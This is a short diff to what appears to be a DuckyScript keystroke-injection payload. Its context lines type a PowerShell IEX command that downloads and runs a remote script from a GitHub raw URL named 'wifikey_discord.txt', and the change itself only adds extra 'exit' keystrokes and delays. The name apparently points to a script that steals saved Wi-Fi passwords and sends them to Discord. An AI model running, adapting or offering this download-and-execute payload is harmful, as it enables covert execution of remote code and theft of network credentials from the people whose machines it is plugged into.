@@ -20,5 +20,9 @@ GUI UP
 DELAY 800
 STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Drack0zz/Code/main/wifikey_discord.txt')
 ENTER
+DELAY 800
+STRING exit
+ENTER
+DELAY 800
 STRING exit
 ENTER
